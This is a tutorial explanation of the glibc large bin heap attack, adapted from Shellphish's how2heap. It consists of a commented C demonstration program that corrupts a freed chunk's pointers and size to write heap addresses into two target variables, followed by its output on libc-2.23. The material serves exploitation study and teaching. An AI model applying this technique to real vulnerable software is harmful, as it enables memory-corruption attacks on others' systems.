# Large Bin Attack Explannation pt 1

This section is based off of: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c

This like all of the other explanations is a well documented C source file explanning how this attack works. This was ran on `Ubuntu 16.04` with `libc-2.23.so`. Here is the source code:

```
// This is based off of Shellphish's how2heap: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c

#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	puts("This will be covering large bin attacks again.");
	puts("Pretty similar to the last section however with a twist.");
	puts("This time we will be using a single large bin attack to write to two seperate addresses.");
	puts("Let's get started.\n");

	unsigned long target0 = 0xdeadbeef;
	unsigned long target1 = 0x00facade;

	printf("Our goal will be to overwrite the target variables.\n");
	printf("Target0 address:\t%p\n", &target0);
	printf("Target0 value:\t\t0x%lx\n\n", target0);
	printf("Target1 address:\t%p\n", &target1);
	printf("Target1 value:\t\t0x%lx\n\n", target1);

	printf("We will start off by allocating six chunks.\n");
	printf("Three of them will be big enough to go into the small/large bins.\n");
	printf("The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.\n");

	unsigned long *ptr0, *ptr1, *ptr2;
	unsigned long *fpt0, *fpt1, *fpt2;


	ptr0 = malloc(0x200);
	fpt0 = malloc(0x10);

	ptr1 = malloc(0x500);
	fpt1 = malloc(0x10);
	
	ptr2 = malloc(0x500);
	fpt2 = malloc(0x10);

	printf("Now we have allocated our chunks.\n");
	
	printf("Large Chunk0:\t%p\n", ptr0);
	printf("Large Chunk1:\t%p\n", ptr1);
	printf("Large Chunk2:\t%p\n", ptr2);

	printf("Small Chunk0:\t%p\n", fpt0);
	printf("Small Chunk1:\t%p\n", fpt1);
	printf("Small Chunk2:\t%p\n\n", fpt2);

	printf("Now we will free the first two large chunks.\n\n");

	free(ptr0);
	free(ptr1);

	printf("Now they are both in the unsorted bin.\n");
	printf("Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.\n");
	printf("We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).\n");
	printf("The first (smaller) chunk will have part of it's space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n");

	malloc(0x10);

	printf("Next up we will insert the third large chunk into the unsorted bin by freeing it.\n\n");

	free(ptr2);


	printf("Now here is where the bug comes in.\n");
	printf("We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).\n");
	printf("Like with the unsorted bin attack, the bk pointer controls where our write goes to.\n");
	printf("However this time, we will also be overwritting the fwd_nextsize and bk_nextsize pointers to give us the second write.\n");
	printf("We will also need to zero out the fwd pointer.\n");

	ptr1[0] = 0;
	ptr1[1] = (unsigned long)((&target0) - 0x2);
	ptr1[2] = 0;
	ptr1[3] = (unsigned long)((&target1) - 0x4);

	printf("We will also need to overwrite it's size values with a smaller value.\n\n");

	ptr1[-1] = 0x300;

	printf("Proceeding that we will allocate another small chunk.\n");

	printf("The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.\n");
	printf("However since the large bin is organized by size, the biggest chunk has to be first.\n");
	printf("Since we overwrote the size of the second chunk with a smaller size, the third chunk will move up and become the front of the large bin.\n");
	printf("This is where our write happens.\n\n");	

	malloc(0x10);

	printf("With that, we can see that the value of the target is:\n");
	printf("Target0 value:\t0x%lx\n", target0);
	printf("Target1 value:\t0x%lx\n", target1);

}
```

When we run it:

```
$	./largebin1 
This will be covering large bin attacks again.
Pretty similar to the last section however with a twist.
This time we will be using a single large bin attack to write to two seperate addresses.
Let's get started.

Our goal will be to overwrite the target variables.
Target0 address:	0x7ffd941d5148
Target0 value:		0xdeadbeef

Target1 address:	0x7ffd941d5150
Target1 value:		0xfacade

We will start off by allocating six chunks.
Three of them will be big enough to go into the small/large bin.
The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.
Now we have allocated our chunks.
Large Chunk0:	0x9f3420
Large Chunk1:	0x9f3650
Large Chunk2:	0x9f3b80
Small Chunk0:	0x9f3630
Small Chunk1:	0x9f3b60
Small Chunk2:	0x9f4090

Now we will free the first two large chunks.

Now they are both in the unsorted bin.
Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.
We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).
The first (smaller) chunk will have part of it's space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.

Next up we will insert the third large chunk into the unsorted bin by freeing it.

Now here is where the bug comes in.
We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).
Like with the unsorted bin attack, the bk pointer controls where our write goes to.
However this time, we will also be overwritting the fwd_nextsize and bk_nextsize pointers to give us the second write.
We will also need to zero out the fwd pointer.
We will also need to overwrite it's size values with a smaller value.

Proceeding that we will allocate another small chunk.
The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.
However since the large bin is organized by size, the biggest chunk has to be first.
Since we overwrote the size of the second chunk with a smaller size, the third chunk will move up and become the front of the large bin.
This is where our write happens.

With that, we can see that the value of the target is:
Target0 value:	0x9f3b70
Target1 value:	0x9f3b70
```
